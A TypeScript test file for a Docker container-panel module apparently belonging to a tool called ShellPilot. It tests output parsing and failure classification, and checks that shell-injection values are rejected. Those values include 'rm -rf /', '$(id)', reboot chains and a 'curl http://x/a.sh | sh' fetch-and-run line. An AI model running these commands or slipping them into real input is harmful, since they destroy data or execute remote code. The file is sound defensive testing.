import { describe, it, expect } from 'vitest'
import {
  parseDockerOutput,
  classifyDockerFailure,
  validateContainerRef,
  buildDockerLogsCommand,
  buildDockerShellCommand,
  DOCKER_LIST_COMMAND,
  DOCKER_SEP,
  extractDockerVersion
} from '../src/shared/docker'

// `docker` not installed, the daemon not running, and the user not being in the
// docker group are three different problems with three different fixes. A panel
// that says "no containers" for all three is lying about two of them, and that
// is the failure this module is shaped around.

const row = (...f: string[]): string => f.join(DOCKER_SEP)
const output = (version: string, rows: string[]): string =>
  `${version}\n===SHELLPILOT-PS===\n${rows.join('\n')}\n`

describe('reading containers', () => {
  it('parses a container list', () => {
    const out = output('24.0.7', [
      row('abc123def4567890', 'web', 'nginx:latest', 'running', 'Up 3 hours', '0.0.0.0:80->80/tcp', '2026-09-01 10:00:00 +0000 UTC'),
      row('def456abc7890123', 'db', 'postgres:16', 'exited', 'Exited (0) 2 days ago', '', '2026-08-30 09:00:00 +0000 UTC')
    ])
    const r = parseDockerOutput(out, 0)
    expect(r.ok).toBe(true)
    if (!r.ok) return
    expect(r.version).toBe('24.0.7')
    expect(r.containers).toHaveLength(2)
    expect(r.containers[0]).toMatchObject({ name: 'web', image: 'nginx:latest', state: 'running' })
    // The short id is what people read and type.
    expect(r.containers[0].shortId).toBe('abc123def456')
  })

  it('includes stopped containers', () => {
    // A stopped container is usually the one being investigated.
    const r = parseDockerOutput(
      output('24.0.7', [row('a1', 'gone', 'img', 'exited', 'Exited (137) 1 hour ago', '', 'now')]),
      0
    )
    expect(r.ok && r.containers[0].state).toBe('exited')
  })

  it('reports an empty list as success, not as a failure', () => {
    // "docker works and nothing is running" is a real answer.
    const r = parseDockerOutput(output('24.0.7', []), 0)
    expect(r.ok).toBe(true)
    expect(r.ok && r.containers).toEqual([])
  })

  it('survives a ports field containing the separator-adjacent characters', () => {
    const r = parseDockerOutput(
      output('24.0.7', [row('a1', 'web', 'nginx', 'running', 'Up 1 min', '0.0.0.0:80->80/tcp, :::80->80/tcp', 'now')]),
      0
    )
    expect(r.ok && r.containers[0].ports).toBe('0.0.0.0:80->80/tcp, :::80->80/tcp')
  })
})

describe('telling the three failures apart', () => {
  it('knows docker is not installed', () => {
    expect(classifyDockerFailure('bash: docker: command not found', 127)).toBe('not-installed')
  })

  it('knows the daemon is not answering', () => {
    expect(
      classifyDockerFailure('Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?', 1)
    ).toBe('daemon-unreachable')
  })

  it('knows it is a permission problem, not a stopped daemon', () => {
    // Both mention the socket. Checking for the daemon first would send
    // someone to restart a daemon that is already running.
    const msg =
      'Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock'
    expect(classifyDockerFailure(msg, 1)).toBe('permission-denied')
  })

  it('surfaces the failure instead of an empty container list', () => {
    const r = parseDockerOutput('bash: docker: command not found\n', 127)
    expect(r.ok).toBe(false)
    if (r.ok) return
    expect(r.reason).toBe('not-installed')
    expect(r.detail).toMatch(/command not found/)
  })

  it('catches a daemon that died between the version probe and the list', () => {
    const out = output('24.0.7', ['Cannot connect to the Docker daemon at unix:///var/run/docker.sock.'])
    const r = parseDockerOutput(out, 1)
    expect(r.ok).toBe(false)
    expect(!r.ok && r.reason).toBe('daemon-unreachable')
  })

  it('falls back to unknown rather than guessing', () => {
    expect(classifyDockerFailure('something else entirely', 1)).toBe('unknown')
  })
})

describe('commands built from a container reference', () => {
  it('accepts real ids and names', () => {
    expect(validateContainerRef('abc123def456')).toBe(true)
    expect(validateContainerRef('my_app-1.web')).toBe(true)
  })

  it('refuses anything that could break out of the command', () => {
    for (const bad of ['a; rm -rf /', 'a b', '$(id)', '`id`', 'a|b', '../x', '-rf', '']) {
      expect(validateContainerRef(bad), bad).toBe(false)
    }
  })

  it('throws rather than building from an invalid reference', () => {
    expect(() => buildDockerLogsCommand('a; reboot')).toThrow(/refusing/)
    expect(() => buildDockerShellCommand('a; reboot')).toThrow(/refusing/)
  })

  it('bounds log output and can follow', () => {
    expect(buildDockerLogsCommand('web', 50)).toMatch(/--tail 50 web/)
    expect(buildDockerLogsCommand('web', 50, true)).toMatch(/-f/)
  })

  it('falls back to sh when the image has no bash', () => {
    // A minimal image has no bash, and the failure is otherwise a pane that
    // dies instantly with no explanation.
    const cmd = buildDockerShellCommand('web')
    expect(cmd).toMatch(/\/bin\/bash/)
    expect(cmd).toMatch(/\|\|.*\/bin\/sh/)
  })

  it('merges stderr so an error is visible rather than an empty pane', () => {
    expect(buildDockerLogsCommand('web')).toMatch(/2>&1/)
  })
})

describe('the list command', () => {
  it('includes stopped containers and full ids', () => {
    expect(DOCKER_LIST_COMMAND).toMatch(/--all/)
    expect(DOCKER_LIST_COMMAND).toMatch(/--no-trunc/)
  })

  it('is read-only', () => {
    expect(DOCKER_LIST_COMMAND).not.toMatch(/\b(rm|stop|kill|prune|exec|run)\b/)
  })
})

// ---------------------------------------------------------------------------
// Below: output shapes copied from real docker, podman and shell installs
// rather than invented ones. Every case failed before the parser was changed.
// ---------------------------------------------------------------------------

describe('error strings real installs actually produce', () => {
  it('does not call a stopped daemon a missing binary', () => {
    // docker 24's message for a socket that is not there ends in the same
    // phrase a shell uses for a missing program. Classified as "not installed"
    // it sends someone to install docker on a host that already has it — the
    // exact "fix the wrong machine" failure this module is shaped around.
    const msg =
      'error during connect: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/version": dial unix /var/run/docker.sock: connect: no such file or directory'
    expect(classifyDockerFailure(msg, 1)).toBe('daemon-unreachable')
  })

  it('does not call a stopped rootless podman a missing binary either', () => {
    const msg = [
      "Cannot connect to Podman. Please verify your connection to the Linux system using `podman system connection list`, or try `podman machine init` and `podman machine start` to manage a Podman machine",
      'Error: unable to connect to Podman socket: Get "http://d/v4.9.4/libpod/_ping": dial unix ///run/user/1000/podman/podman.sock: connect: no such file or directory'
    ].join('\n')
    expect(classifyDockerFailure(msg, 125)).toBe('daemon-unreachable')
  })

  it('reads Docker Desktop on a Windows named pipe as a stopped daemon', () => {
    const msg =
      'error during connect: Get "http://%2F%2F.%2Fpipe%2Fdocker_engine/v1.24/version": open //./pipe/docker_engine: The system cannot find the file specified.'
    expect(classifyDockerFailure(msg, 1)).toBe('daemon-unreachable')
  })

  it('knows the shells apart when the binary really is missing', () => {
    // Each shell words it differently and only the shell says it at all.
    expect(classifyDockerFailure('bash: docker: command not found', 127)).toBe('not-installed')
    expect(classifyDockerFailure('sh: 1: docker: not found', 127)).toBe('not-installed')
    expect(classifyDockerFailure('zsh: command not found: docker', 127)).toBe('not-installed')
    expect(classifyDockerFailure("The command 'docker' could not be found in this WSL 2 distro.", 1)).toBe(
      'not-installed'
    )
    expect(classifyDockerFailure('-bash: /usr/bin/docker: No such file or directory', 126)).toBe('not-installed')
  })

  it('reads a rootful podman socket refusal as permission, not a stopped daemon', () => {
    const msg =
      'Error: unable to connect to Podman socket: Get "http://d/v4.0.0/libpod/_ping": dial unix /run/podman/podman.sock: connect: permission denied'
    expect(classifyDockerFailure(msg, 125)).toBe('permission-denied')
  })

  it('reads docker 24 permission wording without the leading "Got"', () => {
    const msg =
      'permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock'
    expect(classifyDockerFailure(msg, 1)).toBe('permission-denied')
  })
})

describe('output with things printed before the answer', () => {
  it('does not read a docker config warning as a socket permissions failure', () => {
    // This warning is common on shared hosts and says nothing about the socket.
    // The old check tested the whole version block against /error|denied/, so
    // it matched twice over and reported a working docker as a permissions
    // problem against a socket it had never touched.
    const out = [
      'WARNING: Error loading config file: /home/deploy/.docker/config.json: open /home/deploy/.docker/config.json: permission denied',
      '24.0.7',
      '===SHELLPILOT-PS===',
      row('a1b2c3d4e5f6a7b8', 'web', 'nginx:1.25', 'running', 'Up 3 hours', '0.0.0.0:80->80/tcp', '2026-09-01 10:00:00 +0000 UTC')
    ].join('\n')
    const r = parseDockerOutput(out, 0)
    expect(r.ok).toBe(true)
    expect(r.ok && r.version).toBe('24.0.7')
    expect(r.ok && r.containers).toHaveLength(1)
  })

  it('reads a version printed after a buildx plugin warning', () => {
    const out = [
      'WARNING: Plugin "/usr/libexec/docker/cli-plugins/docker-buildx" is not valid: failed to fetch metadata: fork/exec: permission denied',
      '20.10.24',
      '===SHELLPILOT-PS===',
      ''
    ].join('\n')
    const r = parseDockerOutput(out, 0)
    expect(r.ok && r.version).toBe('20.10.24')
  })

  it('reads a `docker --version` fallback line rather than showing it raw', () => {
    // The collector falls back to `docker --version` when the daemon cannot be
    // asked, which is every podman host.
    expect(extractDockerVersion('Docker version 24.0.7, build afdd53b')).toBe('24.0.7')
    expect(extractDockerVersion('podman version 4.9.4')).toBe('4.9.4')
    expect(extractDockerVersion('Docker version 27.3.1-rd, build abcdef')).toBe('27.3.1-rd')
  })

  it('says nothing rather than showing junk when no version came back', () => {
    expect(extractDockerVersion('Emulate Docker CLI using podman. Create /etc/containers/nodocker to quiet msg')).toBeNull()
  })

  it('ignores the podman-docker shim notice in the container list', () => {
    // podman-docker prints this on stderr for EVERY command on Fedora and RHEL,
    // and the collector merges stderr in. It is not an error and not a row.
    const out = [
      '4.9.4',
      '===SHELLPILOT-PS===',
      'Emulate Docker CLI using podman. Create /etc/containers/nodocker to quiet msg',
      row('9f8e7d6c5b4a3928', 'web', 'docker.io/library/nginx:latest', 'running', 'Up 2 hours', '0.0.0.0:8080->80/tcp', '2026-09-01 08:00:00 +0000 UTC')
    ].join('\n')
    const r = parseDockerOutput(out, 0)
    expect(r.ok).toBe(true)
    expect(r.ok && r.containers.map((c) => c.name)).toEqual(['web'])
  })

  it('ignores a kernel warning docker prints before the list', () => {
    const out = [
      '24.0.7',
      '===SHELLPILOT-PS===',
      'WARNING: bridge-nf-call-iptables is disabled',
      'WARNING: No swap limit support',
      row('a1', 'web', 'nginx', 'running', 'Up 1 min', '', 'now')
    ].join('\n')
    expect(parseDockerOutput(out, 0).ok).toBe(true)
  })
})

describe('a podman host, whose docker is a shim', () => {
  it('lists containers even though the daemon version probe cannot be answered', () => {
    // `podman version --format {{.Server.Version}}` fails with a nil-pointer
    // template error, because podman has no server for a local connection. The
    // old parser saw "error" in the version block and reported the whole host
    // as a docker failure — while `docker ps` was working perfectly.
    const out = [
      'Error: template: version:1:2: executing "version" at <.Server.Version>: nil pointer evaluating *define.Version.Version',
      '===SHELLPILOT-PS===',
      row('c0ffee1234567890', 'db', 'quay.io/postgres:16', 'running', 'Up 4 days', '', '2026-08-28 12:00:00 +0000 UTC')
    ].join('\n')
    const r = parseDockerOutput(out, 0)
    expect(r.ok).toBe(true)
    expect(r.ok && r.containers).toHaveLength(1)
    expect(r.ok && r.containers[0].name).toBe('db')
  })

  it('derives a state when the runtime has no .State field to render', () => {
    // Docker before 20.10 has no `.State`, and a Go template prints
    // `<no value>` for a field that is not there. A status chip reading
    // "<no value>" is worse than one read off the status line.
    const out = [
      '19.03.15',
      '===SHELLPILOT-PS===',
      row('a1', 'web', 'nginx', '<no value>', 'Up 3 hours', '', 'now'),
      row('b2', 'old', 'busybox', '<no value>', 'Exited (0) 2 days ago', '', 'now')
    ].join('\n')
    const r = parseDockerOutput(out, 0)
    expect(r.ok && r.containers.map((c) => c.state)).toEqual(['running', 'exited'])
  })
})

describe('rows that are not the shape this parser expects', () => {
  it('says so rather than reporting an empty container list', () => {
    // A different runtime whose template renders a different number of fields
    // gives rows that cannot be read. "No containers" for that is the lie this
    // module exists to avoid, and it is indistinguishable from a quiet host.
    const out = ['4.9.4', '===SHELLPILOT-PS===', ['a1', 'web', 'nginx'].join(DOCKER_SEP)].join('\n')
    const r = parseDockerOutput(out, 0)
    expect(r.ok).toBe(false)
    expect(!r.ok && r.reason).toBe('unknown')
    expect(!r.ok && r.detail).toMatch(/could not read/)
  })

  it('surfaces a template error from docker ps', () => {
    const out = [
      '19.03.15',
      '===SHELLPILOT-PS===',
      'template: :1:2: executing "" at <.State>: can\'t evaluate field State in type *formatter.ContainerContext'
    ].join('\n')
    const r = parseDockerOutput(out, 1)
    expect(r.ok).toBe(false)
    expect(!r.ok && r.detail).toMatch(/State/)
  })

  it('does not read a container of its own as an error message', () => {
    // The failure patterns are only ever applied to lines with no separator,
    // so an image or name containing "error" or "permission denied" is safe.
    const out = [
      '24.0.7',
      '===SHELLPILOT-PS===',
      row('a1', 'permission-denied-test', 'acme/error-reporter:1', 'running', 'Up 1 min', '', 'now')
    ].join('\n')
    const r = parseDockerOutput(out, 0)
    expect(r.ok).toBe(true)
    expect(r.ok && r.containers[0].name).toBe('permission-denied-test')
  })
})

describe('the ports column', () => {
  it('keeps an empty one empty', () => {
    const r = parseDockerOutput(output('24.0.7', [row('a1', 'db', 'postgres:16', 'running', 'Up 1 day', '', 'now')]), 0)
    expect(r.ok && r.containers[0].ports).toBe('')
  })

  it('keeps several published ports, IPv6 included, as one field', () => {
    // Real dual-stack output. Commas and spaces inside it must not be read as
    // field separators.
    const ports = '0.0.0.0:80->80/tcp, [::]:80->80/tcp, 0.0.0.0:443->443/tcp, [::]:443->443/tcp'
    const r = parseDockerOutput(output('24.0.7', [row('a1', 'web', 'nginx', 'running', 'Up 1 day', ports, 'now')]), 0)
    expect(r.ok && r.containers[0].ports).toBe(ports)
  })

  it('keeps a bare exposed port range', () => {
    const r = parseDockerOutput(
      output('24.0.7', [row('a1', 'x', 'img', 'running', 'Up 1 day', '3000-3005/tcp, 9000/udp', 'now')]),
      0
    )
    expect(r.ok && r.containers[0].ports).toBe('3000-3005/tcp, 9000/udp')
  })
})

describe('names real hosts produce', () => {
  it('keeps a compose name and a Kubernetes pod name intact', () => {
    const k8s = 'k8s_POD_coredns-5d78c9869d-abcde_kube-system_1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d_0'
    const r = parseDockerOutput(
      output('24.0.7', [
        row('a1', 'myproj-web-1', 'myproj/web:latest', 'running', 'Up 1 day', '', 'now'),
        row('b2', k8s, 'pause:3.9', 'running', 'Up 1 day', '', 'now')
      ]),
      0
    )
    expect(r.ok && r.containers.map((c) => c.name)).toEqual(['myproj-web-1', k8s])
    // …and long generated names must still be usable for a log request.
    expect(validateContainerRef(k8s)).toBe(true)
  })
})

describe('the field separator', () => {
  it('is a control byte no docker field can hold', () => {
    expect(DOCKER_SEP).toHaveLength(1)
    const code = DOCKER_SEP.charCodeAt(0)
    expect(code).toBeLessThan(0x20)
    // Docker's own name grammar, image reference grammar, and its generated
    // State/Status/Ports/CreatedAt strings are all printable ASCII.
    expect(/^[\x20-\x7e]$/.test(DOCKER_SEP)).toBe(false)
  })

  it('survives a JSON round trip, which is how it reaches the renderer', () => {
    // The parsed rows cross the IPC boundary, and the raw output crosses it in
    // a failure detail. JSON escapes a control byte rather than dropping it.
    const line = row('a1', 'web', 'nginx', 'running', 'Up 1 min', '', 'now')
    expect(JSON.parse(JSON.stringify(line))).toBe(line)
    expect(JSON.stringify(DOCKER_SEP)).toBe('"\\u0001"')
  })

  it('is written as an escape in the command, not as a raw byte', () => {
    // Seven fields, six separators, and none of them invisible in a diff.
    expect(DOCKER_LIST_COMMAND.split(DOCKER_SEP)).toHaveLength(7)
  })
})

describe('the version probe', () => {
  it('falls back to --version so a podman host reports something', () => {
    expect(DOCKER_LIST_COMMAND).toMatch(/docker --version/)
  })

  it('does not let the daemon probe put its error into the version block', () => {
    // podman fails this probe while working perfectly, so its stderr is not
    // evidence of anything. The diagnosis comes from `docker ps`.
    expect(DOCKER_LIST_COMMAND).toMatch(/docker version --format "\{\{\.Server\.Version\}\}" 2>\/dev\/null/)
  })
})

describe('the --tail count, which arrives over IPC', () => {
  it('refuses a non-number rather than interpolating it', () => {
    // `lines: number` on the IPC handler is a compile-time claim; a
    // structured-clone value arrives with whatever type the caller sent, and
    // `--tail ${lines}` is a shell command. This function is exported and used
    // directly, so it cannot rely on a caller having checked.
    for (const bad of ['200; curl http://x/a.sh | sh', '$(id)', '`id`', '200 && reboot', '1e3']) {
      expect(() => buildDockerLogsCommand('web', bad as unknown as number), String(bad)).toThrow(/refusing/)
    }
  })

  it('refuses the non-integers and out-of-range values that slip past a typeof check', () => {
    for (const bad of [NaN, Infinity, -1, 0, 1.5, 1e9]) {
      expect(() => buildDockerLogsCommand('web', bad), String(bad)).toThrow(/refusing/)
    }
  })

  it('leaves nothing injectable in the command it does build', () => {
    const cmd = buildDockerLogsCommand('web', 500)
    expect(cmd).toBe('docker logs --tail 500 web 2>&1')
    // Nothing but the deliberate `2>&1` carries shell meaning.
    expect(cmd.replace(/ 2>&1$/, '')).not.toMatch(/[;|&`$()<>]/)
  })
})

describe('the whole round trip on a host with no docker', () => {
  it('still says "not installed" rather than "no containers"', () => {
    // The version probe now falls back to `docker --version`, so its block no
    // longer carries the diagnosis. The exit status does: an empty list comes
    // back as 0, and 127 is the shell saying it never found the program. This
    // is what the collector actually returns on such a host.
    const out = [
      'bash: docker: command not found',
      '===SHELLPILOT-PS===',
      'bash: docker: command not found',
      ''
    ].join('\n')
    const r = parseDockerOutput(out, 127)
    expect(r.ok).toBe(false)
    expect(!r.ok && r.reason).toBe('not-installed')
    expect(!r.ok && r.detail).toMatch(/command not found/)
  })

  it('reports a stopped daemon from the ps block, with a working version above it', () => {
    // The fallback probe answers even when the daemon does not, so this host
    // reports a version AND a failure — and the failure is the one that matters.
    const out = [
      'Docker version 24.0.7, build afdd53b',
      '===SHELLPILOT-PS===',
      'Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?',
      ''
    ].join('\n')
    const r = parseDockerOutput(out, 1)
    expect(!r.ok && r.reason).toBe('daemon-unreachable')
  })

  it('does not turn a warning-only, exit-zero run into a failure', () => {
    // A host that genuinely has no containers still prints its warnings.
    const out = ['24.0.7', '===SHELLPILOT-PS===', 'WARNING: No swap limit support', ''].join('\n')
    const r = parseDockerOutput(out, 0)
    expect(r.ok).toBe(true)
    expect(r.ok && r.containers).toEqual([])
  })
})
